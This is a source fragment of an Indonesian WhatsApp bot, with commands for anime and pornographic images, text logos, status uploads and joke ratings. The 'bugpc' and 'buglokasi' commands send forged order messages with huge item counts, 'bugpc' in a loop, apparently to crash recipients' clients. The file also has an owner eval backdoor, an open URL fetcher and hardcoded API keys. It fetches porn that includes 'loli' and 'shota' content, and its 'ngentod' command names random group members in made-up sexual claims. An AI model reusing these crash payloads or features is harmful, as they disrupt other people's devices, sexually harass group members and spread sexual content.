if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
hai = (`https://api.lolhuman.xyz/api/random2/keta?apikey=${zerokey}`) 
kon = await getBuffer(hai)
zeroyt7.sendMessage(from, kon, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'awoo':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'blowjob':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'megumin':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'neko':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'trapnime':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
                    case 'chiisaihentai':
                    case 'ahegao':
                    case 'hololewd':
                    case 'sideoppai':
                    case 'animefeets':
                    case 'animebooty':
                    case 'animethighss':
                    case 'hentaiparadise':
                    case 'animearmpits':
                    case 'hentaifemdom':
                    case 'lewdanimegirls':
                    case 'biganimetiddies':
                    case 'animebellybutton':
                    case 'hentai4everyone':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isNsfw) return reply(`Fitur Nsfw Belum Aktif Di Grup Ini\nKetik: ${prefix}nsfw\nUntuk Mengaktifkan`)
                    reply(mess.wait)
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${zerokey}`)
                    zeroyt7.sendMessage(from, ini_buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
                    break
                    //━━━━━━━━━━━━━━━[ FIT WIBU  ]━━━━━━━━━━━━━━━━━//
                    case 'art':
                    case 'exo':
                    case 'elf':
                    case 'loli':
                    case 'waifu':
                    case 'shota':
                    case 'husbu':
                    case 'sagiri':
                    case 'shinobu':
                    case 'megumin':
                    case 'wallnime':
                    reply(mess.wait)
                    buffer = await getBuffer(`http://api.lolhuman.xyz/api/random/${command}?apikey=${zerokey}`)
                    zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol})
                    break
                   
            //━━━━━━━━━━━━━━━[ PP ]━━━━━━━━━━━━━━\\
        
            case 'd':
	        case 'del':
		    case 'delete':
		    if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
		    zeroyt7.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
		    break
		    case 'chat':
		    if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
			if (args[0].startsWith('08')) return reply('Awali nomor dengan 62')
            if (args[0].startsWith('+62')) return reply('Awali nomor dengan 62')
			if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|teks`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            zeroyt7.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
case 'bugpc':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (args.length < 1) return reply('Jumlahnya?')
for (let i = 0; i < args[0]; i++) {
zeroyt7.sendMessage(from, `${botname}`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
},
message: {
orderMessage: {
itemCount: 99999999,
status: 1,
surface: 10,
orderTitle: `${ownername}`,
sellerJid: '0@s.whatsapp.net'
}}}}, 0)
}
break
case 'buglokasi':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
zeroyt7.updatePresence(from, Presence.composing)
		       zeroyt7.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: `${ownername}`,
						address: `${botname}`,
                        jpegThumbnail: ftrol },location,{
 quoted: {
  key: {
   participant: '111111111@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 7000000000000000, // Bug
    status: 1,
    surface: 1,
    message: `${ownername}`,
    orderTitle: `${botname}`, // 
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
break
case 'jadibot':
reply(`Fitur Ini Khusus Owner ${pushname}><`) 
break
//━━━━━━━━━━━━━━━[ F ]━━━━━━━━━━━━━━━━━//
case 'harta': case 'hartatahta': case 'tahta':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)
zeroyt7.sendMessage(from, await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${zerokey}&text=${q}`), image, {quoted: mek, caption: 'Nih Bro'}).catch(() => reply('ERROR'))
break
                    case 'glitch':
                    case 'avenger':
                    case 'space':
                    case 'ninjalogo':
                    case 'marvelstudio':
                    case 'lionlogo':
                    case 'wolflogo':
                    case 'steel3d':
                    case 'wallgravity':
                    if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Bayu Yoaimo`)
                    reply(mess.wait)
                    txt1 = args[0]
                    txt2 = args[1]
                    buffer = await getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${zerokey}&text1=${txt1}&text2=${txt2}`)
                    zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
                    break
                    case 'banerlol':
                    if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Bayu Ganz`)
                    reply(mess.wait)
                    zerr = args.join(" ")
                    buffer = await getBuffer(`https://api.lolhuman.xyz/api/photooxy3/bannerlol?apikey=${zerokey}&text=${zerr}`) 
                    zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
                    break
                    case 'text8bit':
                    if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Bayu Ganz`)
                    reply(mess.wait)
                    txt1 = args[0]
                    txt2 = args[1]
                    buffer = await getBuffer(`https://api.lolhuman.xyz/api/photooxy2/arcade8bit?apikey=${zerokey}&text1=${txt1}&text2=${txt2}`)
                    zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol, caption: '*Kaya Grafik Epep*'})
                    break
                    
                    //━━━━━━━━━━━━━━━[ DAPA API ]━━━━━━━━━━━━━━━━━//
case 'traggold':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)    
zerr = args.join(" ")
buffer = await getBuffer(`https://api.dapuhy.ga/api/textpro/abstragold?text=${zerr}&apikey=bayutamvan`) 
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break
case 'banerlol2':
if (args.length == 0) return reply(`Teks Nya Mana Tod ?\nContoh : ${prefix + command} Hentongers :v :)`)
reply(mess.wait)  
zerr = args.join(" ")
buffer = await getBuffer(`https://api.dapuhy.ga/api/photooxy/lolbanner?text=${zerr}&apikey=bayutamvan`) 
zeroyt7.sendMessage(from, buffer, image, { quoted: ftrol, thumbnail: fs.readFileSync('./zeroyt7/zerothumb.jpg')})
break

              //━━━━━━━━━━━━━━━[ FUN MENU ]━━━━━━━━━━━━━━━━━//
 case 'cek': 
 case 'test':{
 Bayu = Math.floor(Math.random() * 100) + 1
 const emoy = ["🤣","🙂","😄","😁","😎","😀","😃","😁","😝","😐","🗿","??","😵","😲"]
 const emot = emoy[Math.floor(Math.random() * (emoy.length))]
 if (args[0] == 'ganteng') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'cantik') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'goblok') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'baper') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'tomboi') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'banci') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'alay') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'peka') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'cuek') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'manis') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'jelek') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'tollol') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'tolol') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'asu') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gendeng') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gila') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'sange') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'nafsu') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gay') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'lesbi') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'haram') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'bangsat') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'cupu') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'skill') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'skil') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gabut') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gajelas') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'lucu') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'gakjelas') {
 reply(`nilai nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'males') {
 reply(`nilai nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'malas') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'pelit') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'baik') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'buruk') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'arogan') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'mandul') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'galak') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'sabar') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'lebus') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 if (args[0] == 'ikhlas') {
 reply(`nilai ke *${args[0]}* kamu adalah ${Bayu}% ${emot}`)
 }
 }
break
                    case 'semoji':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 🗿`)
                    emoji = args[0]
                    try {
                    emoji = encodeURI(emoji[0])
                    } catch {
                    emoji = encodeURI(emoji)
                    }
                    ini_buffer = await getBuffer(`http://api.lolhuman.xyz/api/smoji/${emoji}?apikey=2ff99ddfb35e897494de4ee6`)
                    zeroyt7.sendMessage(from, ini_buffer, sticker, { quoted: ftrol})
                    break

//━━━━━━━━━━━━━━━[ FITUR UPSW ]━━━━━━━━━━━━━━━━━//

case 'upswteks':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (args.length < 1) return reply('Teksnya?')
teks = body.slice(10)
zeroyt7.sendMessage('status@broadcast', teks, MessageType.text)
reply(`Sukses upload status:\n${teks}`)
break
case 'upswsticker':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
zeroyt7.sendMessage('status@broadcast', buff, sticker)
}
reply(`Sukses upload sticker`)
break
case 'upswaudio':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
buff = await zeroyt7.downloadMediaMessage(encmedia)
zeroyt7.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
}
reply(`Sukses upload audio`)
break
case 'upswvideo':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
var konti = body.slice(11)
reply(mess.wait)
var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var mediap = await zeroyt7.downloadAndSaveMediaMessage(enmediap)
const buffer3 = fs.readFileSync(mediap)
zeroyt7.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
reply(`Sukses upload video:\n${konti}`)
break
case 'upswimage':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
var teksyy = body.slice(11)
reply(mess.wait)
enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(enmedia)
buffer = fs.readFileSync(media)
zeroyt7.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
reply(`Sukses upload image:\n${teksyy}`)
break
case 'upswlokasi':
if (!isOwner) return reply('😒 KAMU ITU BUKAN OWNER HADEH 😒')
if (args.length < 1) return reply('Teksnya?')
teks = body.slice(12)
zeroyt7.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${botname}`}, MessageType.location)
reply(`Sukses upload lokasi:\n${teks}`)
break	
//━━━━━━━━━━━━━━━[ Pepeq Kau. ]━━━━━━━━━━━━━━━━━//
case 'donasi':
case 'donate':
zeroyt7.sendMessage(from, donasi(prefix, botname, ownername), text)
break
//━━━━━━━━━━━━━━━[ ☠️ ]━━━━━━━━━━━━━━━━━//
//━━━━━━━━━━━━━━━[ FITUR ANIME ]━━━━━━━━━━━━━━━━━//
                    case 'naruto': case 'kaneki': case 'mikey': case 'kurama': case 'rimuru': case 'akira': case 'dazai': case 'miku': case 'mikasa': case 'eren': case 'titan': case 'levi': case 'sakura': case 'hinata': case 'neji': 
                    case 'shinobu': case 'kurumi': case 'animerem': case 'minato': case 'jiraya': case 'tsunade': case 'kiba': case 'boruto': case 'sarada': case 'sasuke': 
                    case 'madara': case 'obito': case 'tanjiro': case 'nezuko': case 'luffy': case 'zoro': case 'sanji':                     
                    case 'gon': case 'killua': case 'sagiri': case 'natsu': case 'genos': case 'saitama': case 'miku':  
                    reply(mess.wait)
                buffer = await getBuffer(`https://api-senku.herokuapp.com/api/pinterest?search=${command}&apikey=${bayuapi}`)
                zeroyt7.sendMessage(from, buffer, image, {quoted: ftrol})
                break
                
                case 'bokep':
               reply(mess.wait)
               bokep = await getBuffer (`https://raku-web.herokuapp.com/api/bokep?apikey=${rakuapi}`)
               zeroyt7.sendMessage(from, bokep, video, {mimetype: 'video/mp4', quoted: mek})
               break
                case 'ngentod':		
					case 'ngewe':
				case 'anjirr':
			     	if (!isGroup) return reply(`Hanya Bisa Di Group Saja 😏`)	
					jds = []
					const jdiid = groupMembers
					const kosst = groupMembers
					const hpoo = ['4','5','6','7','8','9'] 
					const kontrod = ['TV','KORAN']
					coook = kontrod[Math.floor(Math.random() * (kontrod.length))] 
					ahahahu = hpoo[Math.floor(Math.random() * (hpoo.length))] 
					const akuut = jdiid[Math.floor(Math.random() * jdiid.length)]
					const diaat = kosst[Math.floor(Math.random() * kosst.length)]
					teks = `Yang ${command} kemarin di grub ini adalah\n@${akuut.jid.split('@')[0]} dan @${diaat.jid.split('@')[0]} \nDIA NGEWE SAMPE ${ahahahu}X KEMARIN\n\nSAMPE MASUK ${coook}:v`
					jds.push(akuut.jid)
					jds.push(diaat.jid)
					mentions(teks, jds, true)
					break
					
     case 'get':
      case 'fetch': //ambil dari nuru
             if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
             res = await fetch(q)
             if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
             delete res
             throw `Content-Length: ${res.headers.get('content-length')}`
}
             if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
             txtx = await res.buffer()
             try {
             txtx = util.format(JSON.parse(txtx+''))
             } catch (e) {
             txtx = txtx + ''
             } finally {
             reply(txtx.slice(0, 65536) + '')
}
             break
             case 'beban':
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break
              case 'ganteng':
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
              case 'cekmati':
              if (!q) return reply('Nama?')
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
              case 'wangy':
              if (!q) return reply('tag orangnya') 
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
              case 'mediafire':
               
               if (args.length < 1) return reply('Link Nya Mana? ')
               if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('eror')
               reply(mess.wait)
               teks = args.join(' ')
               res = await mediafireDl(teks)
               result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *MEDIAFIRE DOWNLOAD*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`• Nama : ${res[0].nama}\`\`\`
\`\`\`• Ukuran : ${res[0].size}\`\`\`
\`\`\`• Link : ${res[0].link}\`\`\`

_*Tunggu Proses Upload Media......*_`
             reply(result)
             sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
             break
       case 'kapankah':
       case 'kapan':
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              zeroyt7.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
              
            
          //━━━━━━━━━━━━━━━[ ☠️ ]━━━━━━━━━━━━━━━━━//
default:
if (isOwner) {
			if (budy.startsWith('>')) {
				console.log(color('[EVAL1]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					reply(`${evaled}`)
				} catch (err) {
					reply(`${err}`)
				}
			} else if (budy.startsWith('x')) {
				console.log(color('[EVAL2]'), color(moment(mek.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
				try {
					return zeroyt7.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
				} catch (err) {
					e = String(err)
					reply(e)
				}
			}
		}
		}
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero") && !e.includes("jid")) {
	console.log('Error : %s', color(e, 'red'))
        }
	// console.log(e)
	}
}


	
    
